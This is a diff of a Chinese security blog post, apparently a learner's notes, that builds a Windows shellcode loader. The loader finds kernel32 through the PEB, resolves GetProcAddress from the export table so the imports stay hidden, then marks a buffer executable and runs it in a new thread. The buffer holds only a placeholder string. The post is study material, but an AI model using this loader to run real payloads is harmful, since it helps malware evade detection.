-<h3 id="64位环境定位PEB内部的dll地址实践"><a href="#64位环境定位PEB内部的dll地址实践" class="headerlink" title="64位环境定位PEB内部的dll地址实践"></a>64位环境定位PEB内部的dll地址实践</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>首先我要在这里说说这个的原理是什么啊，就是说导入表会检查我们程序用了哪些dll对吧，因为dumpbin其实就是通过检查pe文件的导入表来看你这个pe文件用了哪些函数对吧<br>那接下来我们介绍一下导入表<br><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121230255105.png" alt="image-20240121230255105"></p>
+<p><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121192853804.png" alt="image-20240121192853804"></p>
+<p><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121192942895.png" alt="image-20240121192942895"></p>
+<p>很好，开始看不懂了。哦，懂了，就是就是我们要定位一个dll的地址的话，可以进行如下操作<br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121193151924.png" alt="image-20240121193151924"><br>这个就要用那个双机调试环境，具体可以百度（我后续会单独发文）</p>
+<h3 id="64位环境定位PEB内部的dll地址实践"><a href="#64位环境定位PEB内部的dll地址实践" class="headerlink" title="64位环境定位PEB内部的dll地址实践"></a>64位环境定位PEB内部的dll地址实践</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>首先我要在这里说说这个的原理是什么啊，就是说导入表会检查我们程序用了哪些dll对吧，因为dumpbin其实就是通过检查pe文件的导入表来看你这个pe文件用了哪些函数对吧<br>那接下来我们介绍一下导入表<br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121230255105.png" alt="image-20240121230255105"></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LyShark/p/17679082.html">2.5 PE结构：导入表详细解析 - lyshark - 博客园 (cnblogs.com)</a></p>
 <p>具体可以看上面那个博客，讲的非常详细，虽然我看的一知半解的，但是还是继续学下去。</p>
 <p>好吧，继续说会话题，主动找到函数地址来调用函数不会记录到导入表，而怎么找到函数地址呢，那就需要使用GetProAddress函数了，这个函数在kernel32.dll里面，我们就需要手动定位这个dll里面的函数地址就可以了，步骤如下</p>
@@ -365,17 +365,17 @@
 
 <h4 id="实践之获取PEB位置"><a href="#实践之获取PEB位置" class="headerlink" title="实践之获取PEB位置"></a>实践之获取PEB位置</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zUotTe0/p/11421173.html">通过PEB寻找函数地址 - Bl0od - 博客园 (cnblogs.com)</a></p>
 <p>可参考</p>
-<p><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121193340506.png" alt="image-20240121193340506"><br><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121193759404.png" alt="image-20240121193759404"><br>好好好，这些都要自己去实践才行，但是又特别枯燥，很烦，坚持下去把。这里实践一下哈</p>
+<p><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121193340506.png" alt="image-20240121193340506"><br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121193759404.png" alt="image-20240121193759404"><br>好好好，这些都要自己去实践才行，但是又特别枯燥，很烦，坚持下去把。这里实践一下哈</p>
 <p>首先打开你的vs，创建一个新的文件，用来存储汇编代码</p>
-<p><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121194615296.png" alt="image-20240121194615296"></p>
+<p><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121194615296.png" alt="image-20240121194615296"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.CODE</span><br><span class="line">	GetPEB PROC</span><br><span class="line">	mov rax,gs:[60h]</span><br><span class="line">	ret </span><br><span class="line">	GetPEB ENDP</span><br><span class="line">END</span><br></pre></td></tr></table></figure>
 
 <p>这段汇编代码是用于获取进程环境块（Process Environment Block，PEB）的函数。PEB是Windows操作系统中的一个数据结构，记录了当前进程的各种信息和状态。</p>
 <p>具体来说，这段代码的功能是通过读取gs寄存器的偏移地址0x60处的值，将其保存到rax寄存器中，并返回。在Windows x64平台上，gs寄存器用于指向当前线程的Thread Information Block（TIB），而TIB中的一个成员就是PEB的地址。</p>
 <p>通过这个函数，可以方便地获取进程的PEB结构体，从而获得进程的重要信息，如模块列表、命令行参数等。</p>
-<p><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121195141499.png" alt="image-20240121195141499"><br>第二步就是进入这个文件的属性页面，然后设置将其在生成中排除设置成否。就相当于要和我们一起生成<br><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121195250452.png" alt="image-20240121195250452"><br>然后就是将这个改成自定义生成工具，应用一下。</p>
-<p>然后在出现的自定义生成工具中填两项，如下<br>命令行:<code>ml64 /Fo $(IntDir)%(fileName).obj /c %(filename).asm</code><br>输出：<code>$(IntDir)%(fileName).obj</code><br><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121200005252.png" alt="image-20240121200005252"><br><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121213201284.png" alt="image-20240121213201284"></p>
-<p>然后导入（记得加分号）<br><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121213557248.png" alt="image-20240121213557248"><br>最后运行，成功拿到PEB的地址，当然，这只是第一步，我们的目标是什么，是拿到函数地址！</p>
+<p><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121195141499.png" alt="image-20240121195141499"><br>第二步就是进入这个文件的属性页面，然后设置将其在生成中排除设置成否。就相当于要和我们一起生成<br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121195250452.png" alt="image-20240121195250452"><br>然后就是将这个改成自定义生成工具，应用一下。</p>
+<p>然后在出现的自定义生成工具中填两项，如下<br>命令行:<code>ml64 /Fo $(IntDir)%(fileName).obj /c %(filename).asm</code><br>输出：<code>$(IntDir)%(fileName).obj</code><br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121200005252.png" alt="image-20240121200005252"><br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121213201284.png" alt="image-20240121213201284"></p>
+<p>然后导入（记得加分号）<br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121213557248.png" alt="image-20240121213557248"><br>最后运行，成功拿到PEB的地址，当然，这只是第一步，我们的目标是什么，是拿到函数地址！</p>
 <h4 id="获取-x64-InInitializationOrderModuleList-地址"><a href="#获取-x64-InInitializationOrderModuleList-地址" class="headerlink" title="获取 x64_InInitializationOrderModuleList 地址"></a>获取 x64_InInitializationOrderModuleList 地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.CODE</span><br><span class="line">    GetInInitializationOrderModuleList PROC</span><br><span class="line">    mov rax,gs:[60h] ; PEB，不能写 0x60</span><br><span class="line">    mov rax,[rax+18h] ; PEB_LDR_DATA</span><br><span class="line">    mov rax,[rax+30h] ; InInitializationOrderModuleList</span><br><span class="line">    ret ; 不能写 retn</span><br><span class="line">    GetInInitializationOrderModuleList ENDP</span><br><span class="line">END</span><br></pre></td></tr></table></figure>
 
 <p>这个汇编代码就会返回链表的头指针。</p>
@@ -384,13 +384,13 @@
 
 <p>都有详细的注释不错。</p>
 <p>接下来实践一下执行shellcode</p>
-<p><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240122001700455.png" alt="image-20240122001700455"></p>
+<p><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240122001700455.png" alt="image-20240122001700455"></p>
 <p>成功了</p>
-<p><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240122002614109.png" alt="image-20240122002614109"></p>
+<p><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240122002614109.png" alt="image-20240122002614109"></p>
 <p>导入表中没有信息</p>
 <h4 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> &#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength;</span><br><span class="line">    PWSTR Buffer;</span><br><span class="line">&#125; UNICODE_STRING, * PUNICODE_STRING;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    UINT32 SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;</span><br><span class="line">    UNICODE_STRING BaseDllName;</span><br><span class="line">    UINT32 Flags;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT TlsIndex;</span><br><span class="line">    LIST_ENTRY HashLinks;</span><br><span class="line">    PVOID SectionPointer;</span><br><span class="line">    UINT32 CheckSum;</span><br><span class="line">    UINT32 TimeDateStamp;</span><br><span class="line">    PVOID LoadedImports;</span><br><span class="line">    PVOID EntryPointActivationContext;</span><br><span class="line">    PVOID PatchInformation;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 获取 Kernel32 地址，与 x64 不同</span></span><br><span class="line"><span class="function">HMODULE <span class="title">GetKernel32Address</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取 InLoadOrderModuleList</span></span><br><span class="line">    LDR_DATA_TABLE_ENTRY* node = <span class="literal">NULL</span>;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, fs: [<span class="number">0x30</span>] <span class="comment">// PEB</span></span><br><span class="line">        mov eax, [eax + <span class="number">0x0C</span>] <span class="comment">// PEB_LDR_DATA</span></span><br><span class="line">        mov eax, [eax + <span class="number">0x0C</span>] <span class="comment">// InLoadOrderModuleList</span></span><br><span class="line">        mov node, eax</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 遍历 InLoadOrderModuleList</span></span><br><span class="line">    <span class="keyword">char</span> kernel32Name[] = &#123; <span class="string">&#x27;K&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;E&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;R&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;N&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;E&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;L&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;3&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;2&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;.&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;D&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;L&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;L&#x27;</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span> &#125;; <span class="comment">// unicode \0 结尾</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)node-&gt;BaseDllName.Buffer, kernel32Name)) &#123; <span class="comment">// 模块名是 KERNEL32.DLL\0</span></span><br><span class="line">            <span class="keyword">return</span> (HMODULE)node-&gt;DllBase; <span class="comment">// 返回模块基址</span></span><br><span class="line">        &#125;</span><br><span class="line">        node = (LDR_DATA_TABLE_ENTRY*)node-&gt;InLoadOrderLinks.Flink; <span class="comment">// 下一个节点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 获取 GetProcAddress 函数地址，同 x64</span></span><br><span class="line"><span class="function">DWORD64 <span class="title">GetGetProcAddress</span><span class="params">(HMODULE hKernal32)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取 Kernel32.dll DOS头</span></span><br><span class="line">    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hKernal32;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 获取 NT头</span></span><br><span class="line">    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((LONG64)dos + dos-&gt;e_lfanew); <span class="comment">// x64 指针是8字节，e_lfanew 是 DWORD 是4字节，所以要转 LONG64</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 获取导出表</span></span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((LONG64)dos + nt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 函数的地址为ULONG，所以用PULONG指针</span></span><br><span class="line">    PULONG RVAFunctions = (PULONG)((LONG64)dos + exportDir-&gt;AddressOfFunctions); <span class="comment">// 获取导出函数的RVA(相对虚拟地址)数组地址</span></span><br><span class="line">    PULONG RVANames = (PULONG)((LONG64)dos + exportDir-&gt;AddressOfNames); <span class="comment">// 获取导出函数名RVA数组地址</span></span><br><span class="line">    PUSHORT AddressOfNameOrdinals = (PUSHORT)((LONG64)dos + exportDir-&gt;AddressOfNameOrdinals); <span class="comment">// 获取导出函数序号数组地址</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 遍历导出函数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; exportDir-&gt;NumberOfNames; i++) &#123;</span><br><span class="line">        PUCHAR functionName = (PUCHAR)((LONG64)dos + RVANames[i]); <span class="comment">// 获取当前函数名地址</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)functionName, <span class="string">&quot;GetProcAddress&quot;</span>)) &#123; <span class="comment">// 函数名是 GetProcAddress</span></span><br><span class="line">            <span class="keyword">return</span> (ULONG64)((LONG64)dos + RVAFunctions[(USHORT)AddressOfNameOrdinals[i]]); <span class="comment">// 返回当前函数地址</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 定义函数指针类型</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* pGetProcAddress)</span><span class="params">(HMODULE, LPCSTR)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* pVirtualProtect)</span><span class="params">(LPVOID, DWORD, DWORD, PDWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* pCreateThread)</span><span class="params">(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* pWaitForSingleObject)</span><span class="params">(HANDLE, DWORD)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;ShellCode&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    HMODULE hKernal32 = GetKernel32Address(); <span class="comment">// 获取 Kernel32 地址</span></span><br><span class="line">    pGetProcAddress GetProcAddress = (pGetProcAddress)GetGetProcAddress(hKernal32); <span class="comment">// 获取 GetProcAddress 函数地址</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 获取必要函数地址</span></span><br><span class="line">    pVirtualProtect VirtualProtect = (pVirtualProtect)GetProcAddress(hKernal32, <span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">    pCreateThread CreateThread = (pCreateThread)GetProcAddress(hKernal32, <span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">    pWaitForSingleObject WaitForSingleObject = (pWaitForSingleObject)GetProcAddress(hKernal32, <span class="string">&quot;WaitForSingleObject&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 加载 ShellCode</span></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    VirtualProtect((LPVOID)buf, <span class="keyword">sizeof</span> buf, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    HANDLE hThread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)(LPVOID)buf, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="将shellcode存储在资源里"><a href="#将shellcode存储在资源里" class="headerlink" title="将shellcode存储在资源里"></a>将shellcode存储在资源里</h2><p><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240122005256903.png" alt="image-20240122005256903"></p>
+<h2 id="将shellcode存储在资源里"><a href="#将shellcode存储在资源里" class="headerlink" title="将shellcode存储在资源里"></a>将shellcode存储在资源里</h2><p><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240122005256903.png" alt="image-20240122005256903"></p>
 
     </div>
 
@@ -406,11 +406,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/wan1/2024/01/11/linux%E4%B8%8Bphp-rce%E4%B8%8B%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/" rel="prev" title="linux下php-rce下的小技巧">
+    <a href="/2024/01/11/linux%E4%B8%8Bphp-rce%E4%B8%8B%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/" rel="prev" title="linux下php-rce下的小技巧">
       <i class="fa fa-chevron-left"></i> linux下php-rce下的小技巧
     </a></div>
       <div class="post-nav-item">
-    <a href="/wan1/2024/02/01/%E5%B8%B8%E8%A7%81linux%E7%BB%B4%E6%9D%83%E6%96%B9%E6%B3%95-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B8%8E%E5%90%8E%E9%97%A8%E5%A4%84%E7%BD%AE/" rel="next" title="常见linux维权方法-权限维持与后门处置">
+    <a href="/2024/02/01/%E5%B8%B8%E8%A7%81linux%E7%BB%B4%E6%9D%83%E6%96%B9%E6%B3%95-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B8%8E%E5%90%8E%E9%97%A8%E5%A4%84%E7%BD%AE/" rel="next" title="常见linux维权方法-权限维持与后门处置">
       常见linux维权方法-权限维持与后门处置 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -478,14 +478,14 @@
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <img class="site-author-image" itemprop="image" alt="十三"
-      src="/wan1/images/avatar.gif">
+      src="/images/avatar.gif">
   <p class="site-author-name" itemprop="name">十三</p>
   <div class="site-description" itemprop="description">潜心学习，不骄不躁</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/wan1/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">172</span>
           <span class="site-state-item-name">日志</span>
@@ -546,48 +546,48 @@
   </div>
 
   
-  <script src="/wan1/lib/anime.min.js"></script>
-  <script src="/wan1/lib/velocity/velocity.min.js"></script>
-  <script src="/wan1/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/wan1/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/wan1/js/motion.js"></script>
-
-
-<script src="/wan1/js/schemes/pisces.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/wan1/js/next-boot.js"></script>
+<script src="/js/schemes/pisces.js"></script>
 
 
-
-
-  
-
-
-
-
-  
-<script src="/wan1/js/local-search.js"></script>
-
-
-
-
-
-
-
-
-
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
 
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
   
 
-<script src="/wan1/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-tsumiki"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-tsumiki"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
 <!-- 页面点击小红心 -->
 <script type="text/javascript" src="/js/src/clicklove.js"></script>
